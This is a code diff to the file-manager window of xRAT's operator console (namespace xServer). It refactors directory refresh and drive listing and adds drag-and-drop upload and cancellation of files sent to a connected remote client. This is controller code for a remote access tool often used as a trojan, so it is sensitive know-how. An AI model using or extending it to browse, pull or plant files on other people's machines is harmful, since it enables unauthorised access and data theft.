@@ -1,13 +1,16 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Threading;
 using System.Windows.Forms;
+using xServer.Controls;
 using xServer.Core.Commands;
 using xServer.Core.Helper;
-using xServer.Core.Misc;
 using xServer.Core.Networking;
-using PathType = xServer.Core.Commands.CommandHandler.PathType;
+using xServer.Core.Utilities;
+using xServer.Enums;
 
 namespace xServer.Forms
 {
@@ -16,6 +19,7 @@ namespace xServer.Forms
         private string _currentDir;
         private readonly Client _connectClient;
         private readonly ListViewColumnSorter _lvwColumnSorter;
+        public Dictionary<int, string> CanceledUploads = new Dictionary<int, string>();
 
         public FrmFileManager(Client c)
         {
@@ -36,7 +40,7 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = Helper.GetWindowTitle("File Manager", _connectClient);
+                this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
                 new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
             }
         }
@@ -55,9 +59,8 @@ namespace xServer.Forms
                 {
                     if (_connectClient.Value.LastDirectorySeen)
                     {
-                        _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
-                        new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                        _connectClient.Value.LastDirectorySeen = false;
+                        _currentDir = cmbDrives.SelectedValue.ToString();
+                        RefreshDirectory();
                     }
                 }
             }
@@ -83,8 +86,7 @@ namespace xServer.Forms
                         break;
                 }
 
-                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                _connectClient.Value.LastDirectorySeen = false;
+                RefreshDirectory();
             }
         }
 
@@ -98,18 +100,13 @@ namespace xServer.Forms
                 {
                     string path = GetAbsolutePath(files.SubItems[0].Text);
 
-                    int ID = new Random().Next(0, int.MaxValue) + files.Index;
+                    int id = FileHelper.GetNewTransferId(files.Index);
 
                     if (_connectClient != null)
                     {
-                        new Core.Packets.ServerPackets.DoDownloadFile(path, ID).Execute(_connectClient);
+                        new Core.Packets.ServerPackets.DoDownloadFile(path, id).Execute(_connectClient);
 
-                        this.Invoke((MethodInvoker) delegate
-                        {
-                            ListViewItem lvi =
-                                new ListViewItem(new string[] {ID.ToString(), "Downloading...", files.SubItems[0].Text});
-                            lstTransfers.Items.Add(lvi);
-                        });
+                        AddTransfer(id, "Downloading...", files.SubItems[0].Text);
                     }
                 }
             }
@@ -205,11 +202,7 @@ namespace xServer.Forms
 
         private void ctxtRefresh_Click(object sender, EventArgs e)
         {
-            if (_connectClient != null)
-            {
-                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                _connectClient.Value.LastDirectorySeen = false;
-            }
+            RefreshDirectory();
         }
 
         private void ctxtOpenDirectory_Click(object sender, EventArgs e)
@@ -255,26 +248,132 @@ namespace xServer.Forms
         {
             foreach (ListViewItem transfer in lstTransfers.SelectedItems)
             {
-                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
-                if (!CommandHandler.CanceledDownloads.ContainsKey(transfer.Index))
-                    CommandHandler.CanceledDownloads.Add(int.Parse(transfer.Text), "canceled");
-                if (_connectClient != null)
-                    new Core.Packets.ServerPackets.DoDownloadFileCancel(int.Parse(transfer.Text)).Execute(_connectClient);
-                var id = int.Parse(transfer.SubItems[0].Text);
-                CommandHandler.RenamedFiles.Remove(id);
-                UpdateTransferStatus(transfer.Index, "Canceled", 0);
+                if (transfer.SubItems[1].Text.StartsWith("Downloading"))
+                {
+                    int id = int.Parse(transfer.SubItems[0].Text);
+                    if (!CommandHandler.CanceledDownloads.ContainsKey(id))
+                        CommandHandler.CanceledDownloads.Add(id, "canceled");
+                    if (_connectClient != null)
+                        new Core.Packets.ServerPackets.DoDownloadFileCancel(int.Parse(transfer.Text)).Execute(
+                            _connectClient);
+                    CommandHandler.RenamedFiles.Remove(id);
+                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
+                }
+                else if (transfer.SubItems[1].Text.StartsWith("Uploading"))
+                {
+                    int id = int.Parse(transfer.SubItems[0].Text);
+                    if (!CanceledUploads.ContainsKey(id))
+                        CanceledUploads.Add(id, "canceled");
+                }
             }
         }
 
-        public void AddDrives(string[] drives)
+        private void ctxtRemove_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
+            {
+                if (transfer.SubItems[1].Text.StartsWith("Downloading") || transfer.SubItems[1].Text.StartsWith("Uploading")) continue;
+                transfer.Remove();
+            }
+        }
+
+        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
+                e.Effect = DragDropEffects.Copy;
+        }
+
+        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(DataFormats.FileDrop))
+            {
+                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
+                var remoteDir = _currentDir;
+                foreach (string filePath in files)
+                {
+                    if (!File.Exists(filePath)) continue;
+
+                    string path = filePath;
+                    new Thread(() =>
+                    {
+                        int id = FileHelper.GetNewTransferId();
+
+                        if (string.IsNullOrEmpty(path)) return;
+
+                        AddTransfer(id, "Uploading...", Path.GetFileName(path));
+
+                        int index = GetTransferIndex(id);
+                        if (index < 0)
+                            return;
+
+                        FileSplit srcFile = new FileSplit(path);
+                        if (srcFile.MaxBlocks < 0)
+                        {
+                            UpdateTransferStatus(index, "Error reading file", 0);
+                            return;
+                        }
+
+                        string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));
+
+                        if (string.IsNullOrEmpty(remotePath)) return;
+
+                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                        {
+                            if (_connectClient.Value.FrmFm == null) return; // abort upload when from is closed
+
+                            if (CanceledUploads.ContainsKey(id))
+                            {
+                                UpdateTransferStatus(index, "Canceled", 0);
+                                return;
+                            }
+
+                            decimal progress =
+                                Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);
+
+                            UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1);
+
+                            byte[] block;
+                            if (srcFile.ReadBlock(currentBlock, out block))
+                            {
+                                new Core.Packets.ServerPackets.DoUploadFile(id,
+                                    remotePath, block, srcFile.MaxBlocks,
+                                    currentBlock).Execute(_connectClient);
+                            }
+                            else
+                            {
+                                UpdateTransferStatus(index, "Error reading file", 0);
+                                return;
+                            }
+                        }
+
+                        if (remoteDir == _currentDir)
+                            RefreshDirectory();
+
+                        UpdateTransferStatus(index, "Completed", 1);
+                    }).Start();
+                }
+            }
+        }
+
+        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
+        {
+            // refresh when F5 is pressed
+            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
+            {
+                RefreshDirectory();
+                e.Handled = true;
+            }
+        }
+
+        public void AddDrives(RemoteDrive[] drives)
         {
             try
             {
                 cmbDrives.Invoke((MethodInvoker) delegate
                 {
-                    cmbDrives.Items.Clear();
-                    cmbDrives.Items.AddRange(drives);
-                    cmbDrives.SelectedIndex = 0;
+                    cmbDrives.DisplayMember = "DisplayName";
+                    cmbDrives.ValueMember = "RootDirectory";
+                    cmbDrives.DataSource = new BindingSource(drives, null);
                 });
             }
             catch (InvalidOperationException)
@@ -331,15 +430,39 @@ namespace xServer.Forms
             }
         }
 
-        public int GetTransferIndex(string id)
+        public void AddTransfer(int id, string status, string filename)
         {
+            try
+            {
+                lstDirectory.Invoke((MethodInvoker)delegate
+                {
+                    ListViewItem lvi =
+                        new ListViewItem(new string[] { id.ToString(), status, filename });
+                    lstTransfers.Items.Add(lvi);
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(
+                    string.Format(
+                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
+                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        public int GetTransferIndex(int id)
+        {
+            string strId = id.ToString();
             int index = 0;
 
             try
             {
                 lstTransfers.Invoke((MethodInvoker)delegate
                 {
-                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && id == lvi.SubItems[0].Text))
+                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[0].Text)))
                     {
                         index = lvi.Index;
                         break;
@@ -375,6 +498,13 @@ namespace xServer.Forms
                         "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                         ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private void RefreshDirectory()
+        {
+            if (_connectClient == null || _connectClient.Value == null || _connectClient.Value.LastDirectorySeen == false) return;
+            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
+            _connectClient.Value.LastDirectorySeen = false;
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
